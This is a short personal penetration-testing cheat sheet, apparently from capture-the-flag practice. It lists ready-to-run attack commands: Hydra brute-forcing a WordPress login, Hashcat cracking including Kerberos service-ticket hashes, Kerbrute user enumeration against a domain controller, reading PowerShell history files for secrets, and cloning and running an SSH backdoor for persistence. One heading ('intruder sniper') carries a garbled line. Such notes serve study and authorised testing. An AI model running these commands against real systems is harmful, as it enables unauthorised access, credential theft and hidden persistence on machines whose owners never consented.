# Manual Attack CheatSheet

## intruder sniper

-later la males

## hydra example

hydra -l Elliot -P wordl.txt 10.10.203.64 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username' -t 30

## spin up rdp

xfreerdp /u:username /v:host


## Reverse SSH Tunnel 

- ss -tulpn
- ssh -L 10000:localhost:10000 <username>@<ip>


## Hashcat
- hashcat -m 1710 "" --force /Users/c3budiman/Hacking/wordlist/rockyou.txt

## SSH backdoor 
- git clone https://github.com/NinjaJc01/ssh-backdoor
- cd ssh-backdoor
- ssh-keygen
- id_rsa
- chmod +x backdoor
- ./backdoor -a hash

## find flag or file in windows 

Get-ChildItem -Path C:\ -Include *interesting-file.txt* -File -Recurse -ErrorAction SilentlyContinue

## Decode base64 in windows

- certutil -decode "C:\Users\Administrator\Desktop\b64.txt" out.txt
- Get-Content out.txt


Get-Content %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

## hashcat
hashcat -m 13100 -a 0 hash /root/Desktop/wordlists --force --self-test-disable

## kerbrute
python3 kerbrute/kerbrute.py userenum --dc CONTROLLER.local -d CONTROLLER.local wordlist/user.txt